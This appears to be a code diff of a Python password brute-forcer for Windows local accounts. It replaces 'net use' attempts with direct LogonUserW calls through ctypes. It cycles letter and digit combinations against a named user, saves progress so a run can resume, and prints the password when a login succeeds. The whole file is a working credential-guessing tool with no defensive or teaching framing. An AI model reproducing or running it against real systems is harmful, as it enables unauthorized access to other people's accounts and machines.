@@ -1,17 +1,19 @@
 import itertools
-import subprocess
+import ctypes
+from ctypes import wintypes
+import pickle
 import os
 import time
-import pickle
 
 # --- CONFIG ---
-user = "Fortnite Rizzler"  # VM username, spaces supported
+user = "NeckHurt"
 letters = "abcdefghijklmnopqrstuvwxyz"
 numbers = "0123456789"
 state_file = "sigma_state.pkl"
 log_file = "logs/error_log.txt"
 save_every = 100      # Save progress every N combos
 chunk_size = 50000    # Pause every chunk for stability
+manual_start = 0      # Change this to start from a specific combo
 
 # --- SETUP LOGS ---
 os.makedirs("logs", exist_ok=True)
@@ -26,16 +28,27 @@ try:
 except:
     last_index = 0
 
+# Use manual start if higher
+last_index = max(last_index, manual_start)
+
 count = 0
 combo_count = 0
 
-# --- PRECHECK USER ---
-check = subprocess.run(f'net user "{user}"', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-if check.returncode != 0:
-    with open(log_file, "a") as f:
-        f.write(f"{time.ctime()} USER {user} DOES NOT EXIST!\n")
-    print(f"SIGMA ALERT: User '{user}' does not exist. Exiting.")
-    exit()
+# --- Windows API SETUP ---
+advapi32 = ctypes.WinDLL('Advapi32.dll')
+LogonUser = advapi32.LogonUserW
+LOGON32_LOGON_INTERACTIVE = 2
+LOGON32_PROVIDER_DEFAULT = 0
+
+def try_login(username, password):
+    token = wintypes.HANDLE()
+    success = LogonUser(username, None, password,
+                        LOGON32_LOGON_INTERACTIVE,
+                        LOGON32_PROVIDER_DEFAULT,
+                        ctypes.byref(token))
+    if success:
+        return True
+    return False
 
 # --- COMBO GENERATOR ---
 def combo_generator():
@@ -56,20 +69,10 @@ for combo in combo_generator():
 
     print(f"[ATTEMPT {count}] {combo}", end="\r")
 
-    # --- ATTEMPT NET USE ---
     try:
-        result = subprocess.run(
-            f'net use \\\\127.0.0.1 /user:"{user}" {combo}',
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
-            shell=True
-        )
-        if result.returncode == 0:
+        if try_login(user, combo):
             print(f"\n[+] PASSWORD FOUND: {combo}")
             break
-        else:
-            with open(log_file, "a") as f:
-                f.write(f"{time.ctime()} ERROR on combo {combo}: {result.stderr.decode(errors='ignore')}\n")
     except Exception as e:
         with open(log_file, "a") as f:
             f.write(f"{time.ctime()} EXCEPTION on combo {combo}: {str(e)}\n")
@@ -82,6 +85,6 @@ for combo in combo_generator():
     # --- CHUNK PAUSE ---
     if combo_count >= chunk_size:
         combo_count = 0
-        time.sleep(1)  # small pause for VM stability
+        time.sleep(1)
 
 print("\nSIGMA GRIND COMPLETE, MY TOILET!")
